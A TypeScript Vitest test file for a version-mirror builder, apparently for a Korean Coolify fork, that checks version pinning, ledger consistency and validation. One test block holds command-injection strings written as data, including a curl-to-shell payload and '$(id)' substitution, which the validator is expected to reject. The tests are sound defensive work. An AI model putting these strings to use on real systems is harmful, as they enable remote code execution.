import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import type { PublishedLedger } from './ledger.ts';
import { buildMirror, mirrorIssues } from './mirror.ts';

const cdn = JSON.parse(readFileSync(join(import.meta.dirname, 'fixtures', 'versions.json'), 'utf8')) as Record<string, unknown>;
const withVersion = (version: unknown): Record<string, unknown> => {
  const copy = structuredClone(cdn) as { coolify: { v4: { version: unknown } } };
  copy.coolify.v4.version = version;

  return copy;
};
const entry = { kind: 'ko' as const, index: `sha256:${'a'.repeat(64)}`, commit: 'b'.repeat(40), publishedAt: '2026-10-19T00:00:00.000Z' };
const published: PublishedLedger = { schema: 1, versions: { '4.4.6': entry } };
const now = new Date('2026-10-20T00:00:00.000Z');
/** 상류 파일을 고쳐 보는 시험용 꼴 */
interface Dirty {
  coolify: Record<string, Record<string, unknown>>;
  traefik: Record<string, unknown>;
}
const seenAt = '2026-10-19T12:00:00.000Z';

describe('buildMirror', () => {
  it('copies the official file and only points the Coolify version at our latest publication', () => {
    const mirror = buildMirror({ cdn, published, upstreamSeenAt: seenAt, now }) as { coolify: Record<string, unknown>; traefik: unknown };

    expect((mirror.coolify['v4'] as { version: string }).version).toBe('4.4.6');
    expect(mirror.coolify['helper']).toEqual((cdn['coolify'] as Record<string, unknown>)['helper']);
    expect(mirror.coolify['sentinel-host']).toEqual((cdn['coolify'] as Record<string, unknown>)['sentinel-host']);
    expect(mirror.coolify['nightly']).toEqual((cdn['coolify'] as Record<string, unknown>)['nightly']);
    expect(mirror.traefik).toEqual(cdn['traefik']);
  });

  it('keeps the official key order and appends its own record last', () => {
    const mirror = buildMirror({ cdn, published, upstreamSeenAt: seenAt, now });

    expect(Object.keys(mirror)).toEqual(['coolify', 'traefik', 'coolify-ko']);
    expect(Object.keys(mirror['coolify'] as object)).toEqual(Object.keys(cdn['coolify'] as object));
    expect(mirror['coolify-ko']).toEqual({ schema: 1, upstream: '4.4.6', upstreamSeenAt: seenAt, refreshedAt: now.toISOString() });
  });

  it('stays on our latest publication while the official version is ahead', () => {
    const mirror = buildMirror({ cdn: withVersion('4.4.7'), published, upstreamSeenAt: seenAt, now }) as { coolify: { v4: { version: string } }; 'coolify-ko': { upstream: string } };

    expect(mirror.coolify.v4.version).toBe('4.4.6');
    expect(mirror['coolify-ko'].upstream).toBe('4.4.7');
  });

  it('mirror refuses empty ledger', () => {
    expect(() => buildMirror({ cdn, published: { schema: 1, versions: {} }, upstreamSeenAt: seenAt, now })).toThrow();
  });

  it('mirror refuses regressed cdn', () => {
    expect(() => buildMirror({ cdn: withVersion('4.4.5'), published, upstreamSeenAt: seenAt, now })).toThrow();
  });

  it.each([['missing', undefined], ['pre-release', '4.5-rc.1'], ['not text', 446]])('mirror refuses malformed cdn (%s version)', (_label, version) => {
    expect(() => buildMirror({ cdn: withVersion(version), published, upstreamSeenAt: seenAt, now })).toThrow();
  });
});

describe('mirrorIssues', () => {
  const good = buildMirror({ cdn, published, upstreamSeenAt: seenAt, now });
  const edit = (change: (copy: { coolify: Record<string, { version?: string }>; 'coolify-ko'?: unknown }) => void): unknown => {
    const copy = structuredClone(good) as { coolify: Record<string, { version?: string }>; 'coolify-ko'?: unknown };
    change(copy);

    return copy;
  };

  it('accepts a mirror built from the same official file', () => {
    expect(mirrorIssues(good, cdn, published)).toEqual([]);
  });

  it('reports a version above the official one even when we published it', () => {
    const mirror = edit((copy) => {
      (copy.coolify['v4'] ?? {}).version = '4.4.8';
    });

    expect(mirrorIssues(mirror, cdn, { schema: 1, versions: { ...published.versions, '4.4.8': entry } })).toEqual(['상류(4.4.6)보다 높은 버전 4.4.8을 알림']);
  });

  it.each([
    ['a value outside the Coolify version that differs', edit((copy) => {
      (copy.coolify['helper'] ?? {}).version = '9.9.9';
    })],
    ['a missing coolify-ko record', edit((copy) => {
      delete copy['coolify-ko'];
    })],
  ])('reports %s', (_label, mirror) => {
    expect(mirrorIssues(mirror, cdn, published)).toHaveLength(1);
  });

  // 보안 점검(2026-10-22): 상류 Coolify는 helper·sentinel 버전을 이스케이프 없이 셸 명령에 넣는다. 상류 파일이 오염돼도 퍼뜨리지 않는다
  it.each([
    ['a shell command in the helper version', (copy: Dirty) => { copy.coolify.helper = { version: '9.9.9;curl https://x/s|sh;#' }; }],
    ['a space in a traefik version', (copy: Dirty) => { copy.traefik['v3.7'] = '3.7.13 --x'; }],
    ['a malformed sentinel digest', (copy: Dirty) => { copy.coolify['sentinel-host'] = { version: '1.0.2', digest: 'sha256:$(id)' }; }],
    ['a non-text value', (copy: Dirty) => { copy.coolify.sentinel = { version: 102 }; }],
    ['an odd key', (copy: Dirty) => { copy.traefik['v3.7;rm'] = '3.7.13'; }],
  ])('refuses an official file that carries %s', (_label, change) => {
    const dirty = structuredClone(cdn) as unknown as Dirty;
    change(dirty);
    const mirror = buildMirror({ cdn: dirty, published, upstreamSeenAt: seenAt, now });

    expect(mirrorIssues(mirror, dirty, published).some((issue) => issue.startsWith('안전하지 않은 값'))).toBe(true);
  });

  it('reports a version we never published', () => {
    const mirror = buildMirror({ cdn: withVersion('4.4.7'), published: { schema: 1, versions: { '4.4.6': entry, '4.4.7': entry } }, upstreamSeenAt: seenAt, now });

    expect(mirrorIssues(mirror, withVersion('4.4.7'), published)).toEqual(['발행하지 않은 버전 4.4.7을 알림']);
  });
});
